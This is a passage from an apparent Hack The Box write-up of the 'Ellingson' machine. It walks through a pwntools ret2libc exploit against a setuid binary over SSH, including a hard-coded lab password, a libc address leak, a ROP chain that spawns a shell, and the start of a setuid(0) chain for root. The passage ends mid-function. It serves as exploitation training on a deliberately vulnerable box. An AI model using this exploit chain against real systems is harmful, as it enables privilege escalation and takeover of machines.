<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span> 
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">7730</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f3dbe66fab0</span>
</code></pre></div></div>
<p>It’s working fine, to calculate the address of <code class="language-plaintext highlighter-rouge">libc</code> we will simply subtract <code class="language-plaintext highlighter-rouge">libc.sym["__libc_start_main"]</code> from the leaked address:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calculated libc address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">7858</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f56b2056ab0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Calculated</span> <span class="n">libc</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x7f56b2035000</span>
</code></pre></div></div>

<h3 id="exploitation-ret2libc">Exploitation: ret2libc</h3>
<p>Similar to the function <code class="language-plaintext highlighter-rouge">leak()</code> I created another function called <code class="language-plaintext highlighter-rouge">shell()</code> that takes the same arguments as <code class="language-plaintext highlighter-rouge">leak()</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
</code></pre></div></div>
<p>This function will simply call the <code class="language-plaintext highlighter-rouge">pop rdi,ret</code> gadget and place <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> in <code class="language-plaintext highlighter-rouge">rdi</code> then call <code class="language-plaintext highlighter-rouge">system()</code> which will take its argument from <code class="language-plaintext highlighter-rouge">rdi</code> and execute a shell.<br>
We need the addresses of <code class="language-plaintext highlighter-rouge">ret</code> gadget, <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget, <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> string from <code class="language-plaintext highlighter-rouge">libc</code>, <code class="language-plaintext highlighter-rouge">system()</code> from <code class="language-plaintext highlighter-rouge">libc</code>, to get them:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">RET</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">BIN_SH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
	<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
</code></pre></div></div>
<p>Then we will construct the payload:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>
</code></pre></div></div>
<p>And finally we will send the payload and switch into interactive mode:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<p>Let’s test it:
<code class="language-plaintext highlighter-rouge">exploit.py</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">LIBC_START_MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
	<span class="n">PUTS</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">MAIN</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
	
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts@plt: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PUTS</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"__libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"pop rdi gadget: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">LIBC_START_MAIN</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PUTS</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">MAIN</span><span class="p">)</span>

	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Leaked __libc_start_main: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">leak</span>

<span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
	<span class="n">RET</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">BIN_SH</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
	<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>

	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"/bin/sh: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">))</span>
	<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RET</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">BIN_SH</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">)</span>

	<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'password:'</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
	<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">'ellingson.htb'</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s">'margo'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s">'iamgod$08'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="s">'/usr/bin/garbage'</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./garbage"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>

<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Calculated libc address: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>

<span class="n">shell</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span> 
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">22</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">margo</span><span class="err">@</span><span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span>
    <span class="n">Distro</span>    <span class="n">Ubuntu</span> <span class="mi">18</span><span class="p">.</span><span class="mo">04</span>
    <span class="n">OS</span><span class="o">:</span>       <span class="n">linux</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span>
    <span class="n">Version</span><span class="o">:</span>  <span class="mi">4</span><span class="p">.</span><span class="mi">15</span><span class="p">.</span><span class="mi">0</span>
    <span class="n">ASLR</span><span class="o">:</span>     <span class="n">Enabled</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">remote</span> <span class="n">process</span> <span class="err">'</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span> <span class="n">on</span> <span class="n">ellingson</span><span class="p">.</span><span class="n">htb</span><span class="o">:</span> <span class="n">pid</span> <span class="mi">8012</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">ellingson</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Loaded</span> <span class="n">cached</span> <span class="n">gadgets</span> <span class="k">for</span> <span class="err">'</span><span class="p">.</span><span class="o">/</span><span class="n">garbage</span><span class="err">'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">:</span> <span class="mh">0x401050</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x403ff0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="n">gadget</span><span class="o">:</span> <span class="mh">0x40179b</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__libc_start_main</span><span class="o">:</span> <span class="mh">0x7f63c8d7eab0</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Calculated</span> <span class="n">libc</span> <span class="n">address</span><span class="o">:</span> <span class="mh">0x7f63c8d5d000</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">:</span> <span class="mh">0x7f63c8f10e9a</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">system</span><span class="o">:</span> <span class="mh">0x7f63c8dac440</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
 
<span class="n">access</span> <span class="n">denied</span><span class="p">.</span>
<span class="err">$</span> <span class="err">$</span> <span class="n">whoami</span>
<span class="n">margo</span>
<span class="err">$</span> <span class="err">$</span> <span class="n">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">margo</span><span class="p">)</span>
<span class="err">$</span> <span class="err">$</span>  
</code></pre></div></div>
<p>It works, but we get a shell as <code class="language-plaintext highlighter-rouge">margo</code> not <code class="language-plaintext highlighter-rouge">root</code></p>

<h3 id="exploitation-setuid--root-shell">Exploitation: setuid –&gt; root shell</h3>
<p>To solve this we will create another chain that calls <code class="language-plaintext highlighter-rouge">setuid()</code> and sets our <code class="language-plaintext highlighter-rouge">uid</code> to 0.<br>
I created a function called <code class="language-plaintext highlighter-rouge">suid()</code> that takes the same arguments as the other functions:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">suid</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">libc</span><span class="p">,</span><span class="n">rop</span><span class="p">):</span>
</code></pre></div></div>
<p>This function will call the <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget and it will put a <code class="language-plaintext highlighter-rouge">0</code> in <code class="language-plaintext highlighter-rouge">rdi</code>, then it will call <code class="language-plaintext highlighter-rouge">setuid()</code> which will take its argument from <code class="language-plaintext highlighter-rouge">rdi</code> and will set our <code class="language-plaintext highlighter-rouge">uid</code> to 0, and finally it will call <code class="language-plaintext highlighter-rouge">main()</code> again.<br>
We need the addresses of <code class="language-plaintext highlighter-rouge">pop rdi, ret</code> gadget, <code class="language-plaintext highlighter-rouge">setuid()</code> from <code class="language-plaintext highlighter-rouge">libc</code> and <code class="language-plaintext highlighter-rouge">main()</code> from the binary, to get them:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">POP_RDI</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
	<span class="n">SUID</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'setuid'</span><span class="p">]</span>
